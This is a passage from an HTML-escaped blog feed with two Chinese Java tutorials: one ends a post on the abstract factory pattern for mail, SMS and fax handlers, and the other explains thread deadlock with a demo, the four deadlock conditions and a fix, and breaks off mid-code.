&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认邮件发送对象姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂设计模式
&lt;/span>&lt;span style="color:#75715e"> * 传真发送器
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FaxSender&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Sender &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送传真&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">confrimName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;确认传真发送姓名&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个产品簇工厂中，能够生产一个系列的产品。而非单个产品。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂模式
&lt;/span>&lt;span style="color:#75715e"> * 抽象工厂类
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">AbstractMsgHandlerFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 创建发送器方法
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 创建接收器方法
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Receiver &lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂设计模式
&lt;/span>&lt;span style="color:#75715e"> * 传真工厂
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FaxHandlerFactory&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> AbstractMsgHandlerFactory &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FaxSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Receiver &lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FaxReceiver&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂方法设计模式
&lt;/span>&lt;span style="color:#75715e"> * 邮件工厂
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MailHandlerFactory&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> AbstractMsgHandlerFactory &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MailSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Receiver &lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MailReceiver&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂方法设计模式
&lt;/span>&lt;span style="color:#75715e"> * 短信工厂
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMSHandlerFactory&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> AbstractMsgHandlerFactory &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Sender &lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSSender&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Receiver &lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSReceiver&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 工厂设计模式-抽象工厂方法模式
&lt;/span>&lt;span style="color:#75715e"> * 客户端
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 需要处理邮件.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> AbstractMsgHandlerFactory mailFactory &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> MailHandlerFactory&lt;span style="color:#f92672">();&lt;/span>
mailFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
mailFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 需要处理短信
&lt;/span>&lt;span style="color:#75715e">&lt;/span> AbstractMsgHandlerFactory smsFactory &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SMSHandlerFactory&lt;span style="color:#f92672">();&lt;/span>
smsFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
smsFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 需要处理传真
&lt;/span>&lt;span style="color:#75715e">&lt;/span> AbstractMsgHandlerFactory faxFactory &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FaxHandlerFactory&lt;span style="color:#f92672">();&lt;/span>
faxFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createSender&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">send&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
faxFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">createReceiver&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">receive&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过抽象工厂设计模式，将代码的共性重新进行了抽象，从而使代码结构发生了变化。现在一个工厂不再生产单个产品，而是生产一个产品簇。比如 SMSHandlerFactory 工厂生产与 SMS 有关的产品簇的全系列产品。他们包括 SMSReceiver 与 SMSSender。
将来若需要进行产品等级的扩展，如加入了 Forwarder 类产品，我们不需要增加新的工厂类，仅需要在工厂接口中增加 Forwarder 的生产接口，再更改相应实现代码就可以了。
若将来需要进行产品簇的扩展，如增加了 PhoneSender，PhoneRecevier 系列产品，则仅需要增加一个 phoneFactory 就可以解决问题。而不需要更改原有代码。
也就是说，该设计模式再具备了一定的扩展性的同时，又尽可能的控制了类的大量扩张。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>工厂设计模式分为三类。简单工厂，工厂方法，抽象工厂。&lt;/li>
&lt;li>简单工厂模式适合用于项目需求简单，产品很少并且几乎没有扩展可能性的情况。&lt;/li>
&lt;li>工厂方法模式适合用于产品簇单一，但却经常发生改变的情况。&lt;/li>
&lt;li>抽象工厂适合用于项目拥有多个产品簇，且产品等级经常发生改变，并且还需要尽可能控制项目体积的情况。&lt;/li>
&lt;/ol></description></item><item><title>什么是死锁</title><link>https://www.chucklin.net/post/deadlock/</link><pubDate>Fri, 08 Dec 2017 15:07:43 +0800</pubDate><guid>https://www.chucklin.net/post/deadlock/</guid><description>&lt;h3 id="什么是死锁">什么是死锁&lt;/h3>
&lt;p>当线程 A 持有独占锁 a，并尝试去获取独占锁 b 的同时，线程 B 持有独占锁 b ，并尝试获取独占锁 a 的情况下，就会发生 AB 两个线程由于互相持有对方需要的锁，而发生的阻塞现象，我们称为死锁。&lt;/p>
&lt;p>下面用一个非常简单的死锁示例来帮助你理解死锁的定义。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DeadLockDemo&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 线程a
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Thread td1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
DeadLockDemo&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">method1&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
&lt;span style="color:#75715e">// 线程b
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Thread td2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
DeadLockDemo&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">method2&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
td1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
td2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method1&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Thread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sleep&lt;/span>&lt;span style="color:#f92672">(&lt;/span>2000&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InterruptedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;线程a尝试获取integer.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Thread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sleep&lt;/span>&lt;span style="color:#f92672">(&lt;/span>2000&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InterruptedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;线程b尝试获取String.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">----------------&lt;/span>
线程b尝试获取String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
线程a尝试获取integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
&lt;span style="color:#f92672">....&lt;/span>
&lt;span style="color:#f92672">...&lt;/span>
&lt;span style="color:#f92672">..&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>
无限阻塞下去
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="如何避免死锁">如何避免死锁？&lt;/h3>
&lt;p>教科书般的回答应该是，结合“哲学家就餐&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>”模型，分析并总结出以下死锁的原因，最后得出「避免死锁就是破坏造成死锁的，若干条件中的任意一个」的结论。&lt;/p>
&lt;p>造成死锁必须达成的 4 个条件：&lt;/p>
&lt;ol>
&lt;li>互斥条件：一个资源每次只能被一个线程使用。&lt;/li>
&lt;li>请求与保持条件：一个线程因请求资源而阻塞时，对已获得的资源保持不放。&lt;/li>
&lt;li>不剥夺条件：线程已获得的资源，在未使用完之前，不能强行剥夺。&lt;/li>
&lt;li>循环等待条件：若干线程之间形成一种头尾相接的循环等待资源关系。&lt;/li>
&lt;/ol>
&lt;p>但是，「哲学家就餐」过于学术派了。 对 4 个造成死锁的条件进行逐条分析，我们可以得出以下  结论。&lt;/p>
&lt;ol>
&lt;li>互斥条件 &amp;mdash;&amp;gt; 独占锁的特点之一。&lt;/li>
&lt;li>请求与保持条件 &amp;mdash;&amp;gt; 独占锁的特点之一，尝试获取锁时并不会释放已经持有的锁&lt;/li>
&lt;li>不剥夺条件 &amp;mdash;&amp;gt; 独占锁的特点之一。&lt;/li>
&lt;li>循环等待条件 &amp;mdash;&amp;gt; 唯一需要记忆的造成死锁的条件。&lt;/li>
&lt;/ol>
&lt;p>不错！复杂的死锁条件经过简化，现在需要记忆的仅只有独占锁与第四个条件而已。&lt;/p>
&lt;dl>
&lt;dt>所以，面对如何避免死锁这个问题，我们只需要这样回答！&lt;/dt>
&lt;dd>在并发程序中，避免了逻辑中出现复数个线程互相持有对方线程所需要的独占锁的的情况，就可以避免死锁。&lt;/dd>
&lt;/dl>
&lt;p>下面我们通过“破坏”第四个死锁条件，来解决第一个小节中的死锁示例并证明我们的结论。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DeadLockDemo2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 线程a
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Thread td1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
DeadLockDemo2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">method1&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
&lt;span style="color:#75715e">// 线程b
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Thread td2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
DeadLockDemo2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">method2&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
td1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
td2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method1&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Thread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sleep&lt;/span>&lt;span style="color:#f92672">(&lt;/span>2000&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InterruptedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;线程a尝试获取integer.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;线程a获取到integer.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 不再获取线程a需要的Integer.class锁。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Thread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sleep&lt;/span>&lt;span style="color:#f92672">(&lt;/span>2000&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InterruptedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
